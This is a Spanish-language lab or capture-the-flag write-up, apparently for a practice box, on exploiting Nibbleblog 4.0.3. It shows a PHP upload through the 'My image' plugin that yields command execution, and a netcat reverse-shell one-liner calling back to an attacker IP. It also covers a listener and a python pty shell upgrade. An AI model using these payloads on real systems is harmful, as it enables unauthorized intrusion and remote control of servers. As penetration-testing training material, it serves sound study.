# Punto inicial

## Resumen

Tras acceder al portal de administración de Nibbleblog (v4.0.3), se enumeraron las funcionalidades del panel y se encontró que el plugin **"My image"** permite subir archivos. Se aprovechó esto para subir un archivo PHP en lugar de una imagen, logrando **ejecución remota de comandos (RCE)** como el usuario `nibbler`. A continuación se transformó esa ejecución en un **reverse shell** (shell inversa) y se mejoró la sesión a un TTY interactivo usando `python3`.

---

## Páginas del panel observadas

* **Publish:** crear posts/páginas (puede ser útil).
* **Comments:** no muestra comentarios.
* **Manage:** administrar posts, páginas y categorías.
* **Settings:** confirma versión vulnerable **4.0.3**.
* **Themes:** instalar temas preseleccionados.
* **Plugins:** instalar/configurar/desinstalar plugins — **My image** permite subir un archivo de imagen (posible vector de abuso).

---

## Prueba de ejecución remota (subida de PHP)

Subir un archivo PHP sencillo para probar ejecución:

```php
<?php system('id'); ?>
```

Guardar y subir mediante el formulario del plugin "My image" (Browse → Upload). Pueden aparecer errores de imagen (GD) como estos:

```
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117
Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118
Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43
Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```

Si la subida tuvo éxito, el fichero suele aparecer en:

```
http://<host>/nibbleblog/content/private/plugins/my_image/
```

Comprobar ejecución con `curl`:

```bash
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
```

Salida esperada:

```
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

---

## Escalar a reverse shell

Editar localmente el PHP para ejecutar un reverse shell (payload en una línea Bash) y volver a subirlo. Ejemplo de payload (sustituir IP y puerto):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f
```

Ejemplo insertado en PHP:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

Preparar listener en la máquina atacante:

```bash
nc -lvnp 9443
```

Accionar la URL (curl o navegador) para disparar el payload:

```
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
```

Al recibir la conexión:

```
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

---

## Mejorar el shell (TTY interactivo)

El shell recibido no es un TTY completo. Para convertirlo a un TTY más usable, intentar:

Intento (Python2) — puede fallar si `python` no está instalado:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Si `python` no existe pero sí `python3`:

```bash
which python3
# /usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Después de esto tendrás un shell más completo que permite usar `su`, editores, completado con tab, etc.

---

## Notas y buenas prácticas

* Registrar todos los pasos y conservar evidencia (salidas, URLs, timestamps).
* Siempre confirmar el alcance y autorización antes de explotar vulnerabilidades.
* Si el servidor tiene protección o filtros, considera opciones alternativas (subida renombrada, bypass de validaciones, explotación autenticada con credenciales válidas, uso de Metasploit si procede).
* Limpiar artefactos (eliminar PHP subido) si no se requiere persistencia.

---
